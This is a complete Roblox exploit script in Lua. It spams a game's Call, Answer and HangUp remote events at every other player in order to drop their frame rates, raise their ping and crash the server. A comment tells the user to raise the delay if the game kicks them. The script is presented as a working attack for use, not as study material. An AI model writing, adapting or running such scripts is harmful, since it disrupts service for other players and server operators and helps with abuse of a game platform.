-- // This script will drop everyones FPS and increase their ping, more people = server dies faster

getgenv().SpamDelay = 3 -- // Increase this if it kicks you
if not game:IsLoaded() then game.Loaded:Wait(); end

-- // Services
local ReplicatedStorage = game:GetService("ReplicatedStorage");
local RunService = game:GetService("RunService");
local Players = game:GetService("Players");

-- // Variables
local Client = Players.LocalPlayer

local Remotes = ReplicatedStorage:FindFirstChild("Remotes");
local Call = Remotes:FindFirstChild("Call");
local Answer = Remotes:FindFirstChild("Answer");
local HangUp = Remotes:FindFirstChild("HangUp");

-- // Connections
RunService.PostSimulation:Connect(function() 
    for i = 1, #Players:GetPlayers() do     
        local Player = Players:GetPlayers()[i];
        if Player == Client then continue end 
        
        Call:FireServer(Player);
        Answer:FireServer(Client);
        HangUp:FireServer(Client);

        task.wait(getgenv().SpamDelay);
    end
end);
